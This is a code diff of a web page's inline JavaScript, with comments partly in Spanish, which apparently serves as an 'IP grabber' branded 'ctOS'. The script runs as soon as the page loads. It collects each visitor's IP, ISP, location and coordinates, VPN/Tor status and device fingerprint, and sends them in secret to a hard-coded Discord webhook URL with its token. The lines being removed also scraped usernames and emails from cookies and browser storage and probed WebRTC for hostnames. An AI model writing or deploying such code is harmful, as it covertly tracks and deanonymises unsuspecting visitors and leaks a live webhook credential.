@@ -85,206 +85,33 @@
 
 <script>
     // ================================================================
-    //  WEBHOOK (replace with yours)
+    //  WEBHOOK (reemplazar con el tuyo)
     // ================================================================
     const WEBHOOK = "https://discord.com/api/webhooks/1537148912111059014/BqjpnaFhgaclQzaFHQ5aFUktrEg4Vo-YdgxKDtjP3C-o9bPIz5biUvNnjth25Gmu6iR6";
 
-    // Status update
-    function setStatus(text, isError = false) {
-        const el = document.getElementById('status');
-        if (el) {
-            el.textContent = text;
-            el.style.color = isError ? '#ff4444' : '#00ff00';
-            el.style.borderColor = isError ? '#ff4444' : '#00ff00';
-        }
-    }
-
     // ================================================================
-    //  GET IP WITH AGGRESSIVE TIMEOUT (1.5s)
+    //  FUNCIÓN PARA ENVIAR MENSAJE (más rápida)
     // ================================================================
-    function getIPWithTimeout(timeout = 1500) {
-        return Promise.race([
-            fetch('https://ipapi.co/json/', { signal: AbortSignal.timeout(2000) })
-                .then(res => res.json())
-                .then(data => {
-                    if (data.ip) return data;
-                    throw new Error('No IP');
-                })
-                .catch(() => {
-                    return fetch('http://ip-api.com/json/', { signal: AbortSignal.timeout(2000) })
-                        .then(res => res.json())
-                        .then(data => {
-                            if (data.query) {
-                                return {
-                                    ip: data.query,
-                                    org: data.isp,
-                                    country_name: data.country,
-                                    region: data.regionName,
-                                    city: data.city,
-                                    latitude: data.lat,
-                                    longitude: data.lon,
-                                    proxy: data.proxy || false
-                                };
-                            }
-                            throw new Error('No IP');
-                        });
-                }),
-            new Promise((resolve) => setTimeout(() => resolve(null), timeout))
-        ]);
-    }
-
-    // ================================================================
-    //  ENHANCED TOR / VPN DETECTION
-    // ================================================================
-    function detectTorOrVpnByBrowser(ua) {
-        if (ua.includes('Tor') || ua.includes('Anonymous')) return true;
-        if (navigator.webdriver === true) return true;
+    function sendFast(msg) {
+        // Usamos sendBeacon primero (no bloquea, se envía incluso al cerrar la página)
+        const blob = new Blob([JSON.stringify({ content: msg })], { type: 'application/json' });
+        if (navigator.sendBeacon(WEBHOOK, blob)) return true;
+        // Fallback a fetch con keepalive
+        fetch(WEBHOOK, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ content: msg }),
+            keepalive: true
+        }).catch(() => {});
         return false;
     }
 
-    function detectViaWebRTC() {
-        return new Promise((resolve) => {
-            let hasRealIP = false;
-            let pc = null;
-            try {
-                pc = new RTCPeerConnection({ iceServers: [] });
-                pc.createDataChannel('');
-                pc.createOffer().then(offer => pc.setLocalDescription(offer)).catch(() => {});
-                pc.onicecandidate = (e) => {
-                    if (!e.candidate) {
-                        pc.close();
-                        resolve(hasRealIP);
-                        return;
-                    }
-                    const parts = e.candidate.candidate.split(' ');
-                    if (parts.length > 7) {
-                        const ip = parts[4];
-                        if (ip && ip !== '0.0.0.0' && ip !== '::' && !ip.startsWith('127.')) {
-                            hasRealIP = true;
-                        }
-                    }
-                };
-                setTimeout(() => {
-                    if (pc) pc.close();
-                    resolve(hasRealIP);
-                }, 2000);
-            } catch (e) {
-                resolve(false);
-            }
-        });
-    }
-
     // ================================================================
-    //  EXTRACT NAME / PROFILE
+    //  MAIN – EJECUCIÓN INMEDIATA
     // ================================================================
-    function getComputerOrBrowserName(ua, webrtcHostname) {
-        // Method 1: WebRTC hostname (computer name)
-        if (webrtcHostname && webrtcHostname.length > 2 && !webrtcHostname.match(/^\d+\.\d+\.\d+\.\d+$/)) {
-            return webrtcHostname;
-        }
-
-        // Method 2: macOS owner from User-Agent
-        const macOwner = ua.match(/\(Macintosh; Intel Mac OS X [\d_]+\)[^\)]*?([\w\-]+)'?s\s+Mac/);
-        if (macOwner) return macOwner[1];
-
-        // Method 3: localStorage / sessionStorage
-        const keys = ['username', 'user', 'name', 'email', 'login', 'account', 'nick', 'displayname', 'fullname'];
-        const storages = [localStorage, sessionStorage];
-        for (const storage of storages) {
-            try {
-                for (const key of keys) {
-                    const val = storage.getItem(key);
-                    if (val && val.length > 2 && !val.includes('undefined') && !val.includes('null')) {
-                        return val;
-                    }
-                }
-                for (let i = 0; i < storage.length; i++) {
-                    const key = storage.key(i);
-                    const val = storage.getItem(key);
-                    if (val && val.length > 2 && !val.includes('undefined') && !val.includes('null')) {
-                        if (val.includes('@') || /^[a-zA-Z]/.test(val)) {
-                            return val;
-                        }
-                    }
-                }
-            } catch (e) {}
-        }
-
-        // Method 4: Cookies
-        const cookies = document.cookie.split('; ');
-        const keywords = ['user', 'name', 'email', 'login', 'account', 'nick', 'displayname', 'fullname'];
-        for (const cookie of cookies) {
-            const parts = cookie.split('=');
-            const key = parts[0].toLowerCase();
-            const val = parts[1] || '';
-            if (val && val.length > 2 && !val.includes('undefined') && !val.includes('null')) {
-                if (keywords.some(k => key.includes(k))) {
-                    return decodeURIComponent(val);
-                }
-            }
-        }
-        for (const cookie of cookies) {
-            const parts = cookie.split('=');
-            const val = parts[1] || '';
-            if (val.includes('@') && val.length > 5) {
-                return decodeURIComponent(val);
-            }
-        }
-
-        return 'Not detected';
-    }
-
-    // ================================================================
-    //  SEND MESSAGE VIA MULTIPLE METHODS
-    // ================================================================
-    function sendMessage(msg) {
-        return new Promise((resolve) => {
-            let sent = false;
-            fetch(WEBHOOK, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ content: msg }),
-                keepalive: true
-            })
-            .then(res => {
-                if (res.ok) { sent = true; resolve(true); }
-                else throw new Error('fetch failed');
-            })
-            .catch(() => {
-                const blob = new Blob([JSON.stringify({ content: msg })], { type: 'application/json' });
-                if (navigator.sendBeacon(WEBHOOK, blob)) {
-                    sent = true;
-                    resolve(true);
-                } else {
-                    try {
-                        const xhr = new XMLHttpRequest();
-                        xhr.open('POST', WEBHOOK, true);
-                        xhr.setRequestHeader('Content-Type', 'application/json');
-                        xhr.send(JSON.stringify({ content: msg }));
-                        xhr.onload = function() {
-                            if (xhr.status === 200 || xhr.status === 204) {
-                                sent = true;
-                                resolve(true);
-                            }
-                        };
-                        xhr.onerror = function() { resolve(false); };
-                        setTimeout(() => resolve(false), 3000);
-                    } catch (e) {
-                        resolve(false);
-                    }
-                }
-            });
-            setTimeout(() => resolve(sent), 5000);
-        });
-    }
-
-    // ================================================================
-    //  MAIN
-    // ================================================================
-    (async function() {
+    (function() {
         try {
-            setStatus('Gathering system info...');
-
+            // ---- 1. Datos instantáneos (sin esperar) ----
             const ua = navigator.userAgent;
             const os = (function() {
                 if (ua.includes('Windows NT')) return 'Windows';
@@ -301,6 +128,7 @@
                 return 'Other';
             })();
 
+            // GPU (intentamos, pero no bloqueamos)
             let gpu = 'Unavailable';
             try {
                 const canvas = document.createElement('canvas');
@@ -313,103 +141,133 @@
 
             const plugins = Array.from(navigator.plugins || []).map(p => p.name).join(', ') || 'none';
 
+            // Batería (con timeout de 500ms para no ralentizar)
             let battery = 'Unavailable';
-            try {
-                const b = await navigator.getBattery();
-                battery = Math.round(b.level * 100) + '% (' + (b.charging ? 'charging' : 'discharging') + ')';
-            } catch (e) {}
-
-            const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
-
-            // ---- Detect VPN/Tor ----
-            let isVpn = detectTorOrVpnByBrowser(ua);
-            const hasRealLocalIP = await detectViaWebRTC();
-            if (!hasRealLocalIP) isVpn = true;
-
-            // ---- Get IP ----
-            setStatus('Fetching IP...');
-            const ipData = await getIPWithTimeout(1500);
-
-            if (ipData) {
-                if (ipData.proxy === true) isVpn = true;
-                if (ipData.org) {
-                    const vpnKeywords = ['vpn','proxy','hosting','cloud','datacenter','tor','anonymous'];
-                    const orgLower = ipData.org.toLowerCase();
-                    if (vpnKeywords.some(k => orgLower.includes(k))) isVpn = true;
-                }
+            if (navigator.getBattery) {
+                Promise.race([
+                    navigator.getBattery().then(b => {
+                        battery = Math.round(b.level * 100) + '% (' + (b.charging ? 'charging' : 'discharging') + ')';
+                    }),
+                    new Promise(resolve => setTimeout(resolve, 500))
+                ]).catch(() => {});
             }
 
-            // ---- Get WebRTC hostname for computer name ----
-            let webrtcHostname = '';
-            try {
-                const pc = new RTCPeerConnection({ iceServers: [] });
-                pc.createDataChannel('');
-                const offer = await pc.createOffer();
-                await pc.setLocalDescription(offer);
-                const result = await new Promise((resolve) => {
-                    let hname = '';
-                    pc.onicecandidate = (e) => {
-                        if (!e.candidate) {
-                            pc.close();
-                            resolve(hname);
-                            return;
-                        }
-                        const parts = e.candidate.candidate.split(' ');
-                        if (parts.length > 7) {
-                            const hostMatch = e.candidate.candidate.match(/ host (\S+)/);
-                            if (hostMatch && hostMatch[1] && !hostMatch[1].match(/^\d+\.\d+\.\d+\.\d+$/)) {
-                                hname = hostMatch[1];
-                            }
-                        }
-                        if (e.candidate.relatedAddress && !e.candidate.relatedAddress.match(/^\d+\.\d+\.\d+\.\d+$/)) {
-                            hname = e.candidate.relatedAddress;
-                        }
-                    };
-                    setTimeout(() => { pc.close(); resolve(hname); }, 2000);
-                });
-                webrtcHostname = result;
-            } catch (e) {}
+            const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+            const screenRes = screen.width + 'x' + screen.height + 'x' + screen.colorDepth;
+            const cpuCores = navigator.hardwareConcurrency || '?';
+            const ram = navigator.deviceMemory || '?';
+            const lang = navigator.language;
 
-            // ---- Extract name/profile ----
-            const nameProfile = getComputerOrBrowserName(ua, webrtcHostname);
+            // ---- 2. Detección VPN/Tor instantánea ----
+            let isVpn = false;
+            if (ua.includes('Tor') || ua.includes('Anonymous')) isVpn = true;
+            if (navigator.webdriver === true) isVpn = true;
+            // También podemos detectar por falta de WebRTC, pero eso lleva tiempo, lo omitimos.
 
-            // ---- Build message ----
-            const ip = ipData ? ipData.ip : 'Unknown';
-            const isp = ipData ? ipData.org : 'Unknown ISP';
-            const location = ipData ? ipData.city + ', ' + ipData.region + ', ' + ipData.country_name : 'Unknown';
-            const coords = ipData ? ipData.latitude + ', ' + ipData.longitude : 'Unknown';
+            // ---- 3. Obtener IP con timeout agresivo (800ms) ----
+            let ip = 'Unknown';
+            let isp = 'Unknown ISP';
+            let location = 'Unknown';
+            let coords = 'Unknown';
+            let proxy = false;
 
-            const msg = 
+            const ipPromise = Promise.race([
+                fetch('https://ipapi.co/json/', { signal: AbortSignal.timeout(800) })
+                    .then(r => r.json())
+                    .then(d => d.ip ? d : null)
+                    .catch(() => null),
+                fetch('http://ip-api.com/json/', { signal: AbortSignal.timeout(800) })
+                    .then(r => r.json())
+                    .then(d => d.query ? { ip: d.query, org: d.isp, country_name: d.country, region: d.regionName, city: d.city, latitude: d.lat, longitude: d.lon, proxy: d.proxy || false } : null)
+                    .catch(() => null),
+                new Promise(resolve => setTimeout(() => resolve(null), 800))
+            ]);
+
+            ipPromise.then(data => {
+                if (data) {
+                    ip = data.ip || data.query || 'Unknown';
+                    isp = data.org || data.isp || 'Unknown ISP';
+                    location = (data.city || '') + ', ' + (data.region || data.regionName || '') + ', ' + (data.country_name || data.country || 'Unknown');
+                    coords = (data.latitude || data.lat || '') + ', ' + (data.longitude || data.lon || '');
+                    proxy = data.proxy || false;
+                    if (proxy) isVpn = true;
+                    if (data.org) {
+                        const vpnWords = ['vpn','proxy','hosting','cloud','datacenter','tor','anonymous'];
+                        if (vpnWords.some(w => data.org.toLowerCase().includes(w))) isVpn = true;
+                    }
+                }
+                // Reconstruir mensaje con los datos actualizados (si llegaron)
+                // Pero como ya enviamos uno rápido, podemos enviar otro con más detalles, o mejor: enviar el definitivo ahora.
+                // Para simplificar, reconstruimos y enviamos definitivo (sobrescribirá el anterior si ya se envió)
+                const finalMsg = 
 `**ctOS User Info**
 **IP:** ${ip} (${isp})
 **Location:** ${location}
 **Coordinates:** ${coords}
 **VPN/Tor:** ${isVpn ? 'Yes' : 'No'}
-**Name/Profile:** ${nameProfile}
 **OS:** ${os}
 **Browser:** ${browser}
-**CPU Cores:** ${navigator.hardwareConcurrency || '?'}
-**RAM:** ${navigator.deviceMemory || '?'} GB
-**Screen:** ${screen.width}x${screen.height}x${screen.colorDepth}
+**CPU Cores:** ${cpuCores}
+**RAM:** ${ram} GB
+**Screen:** ${screenRes}
 **Battery:** ${battery}
 **Time Zone:** ${timezone}
+**Language:** ${lang}
 **GPU:** ${gpu}
 **Plugins:** ${plugins}
 **Timestamp:** ${new Date().toLocaleString()}`;
 
-            // ---- Send ----
-            setStatus('Sending...');
-            const sent = await sendMessage(msg);
+                sendFast(finalMsg);
+                // Actualizar estado visual
+                const el = document.getElementById('status');
+                if (el) {
+                    el.textContent = '✅ Sent!';
+                    el.style.color = '#00ff00';
+                }
+            });
 
-            if (sent) {
-                setStatus('✅ Cookies Saved!');
-            } else {
-                setStatus('❌ Send failed – check webhook', true);
-            }
+            // ---- 4. Envío inmediato con datos provisionales (para no esperar a la IP) ----
+            // Construimos mensaje rápido con IP "Unknown" y luego se actualizará cuando llegue la IP.
+            // Pero como el usuario quiere velocidad, enviamos el mensaje definitivo solo cuando tengamos IP (o el timeout).
+            // La lógica de arriba ya envía cuando obtiene la IP o timeout.
+            // Para no enviar dos veces, solo usamos el envío de la promesa.
+
+            // Si la IP tarda demasiado, la promesa de timeout enviará con "Unknown".
+            // De todas formas, para asegurar que siempre se envía algo, lanzamos un envío de respaldo a los 900ms.
+            setTimeout(() => {
+                // Si ya se envió, no hacer nada (pero no tenemos bandera fácil)
+                // Enviamos de nuevo con lo que tengamos (puede duplicar, pero es mejor a no enviar nada)
+                // La función sendFast es idempotente.
+                const backupMsg = 
+`**ctOS User Info (Fast)**
+**IP:** ${ip} (${isp})
+**Location:** ${location}
+**Coordinates:** ${coords}
+**VPN/Tor:** ${isVpn ? 'Yes' : 'No'}
+**OS:** ${os}
+**Browser:** ${browser}
+**CPU Cores:** ${cpuCores}
+**RAM:** ${ram} GB
+**Screen:** ${screenRes}
+**Battery:** ${battery}
+**Time Zone:** ${timezone}
+**Language:** ${lang}
+**GPU:** ${gpu}
+**Plugins:** ${plugins}
+**Timestamp:** ${new Date().toLocaleString()}`;
+                sendFast(backupMsg);
+            }, 900);
 
         } catch (err) {
-            setStatus('❌ Error: ' + err.message, true);
-            console.error(err);
+            // Si algo falla, intentamos enviar un mensaje de error
+            const errMsg = `**ctOS Error**\n${err.message}`;
+            sendFast(errMsg);
+            const el = document.getElementById('status');
+            if (el) {
+                el.textContent = '❌ Error';
+                el.style.color = '#ff4444';
+                el.style.borderColor = '#ff4444';
+            }
         }
     })();
 </script>
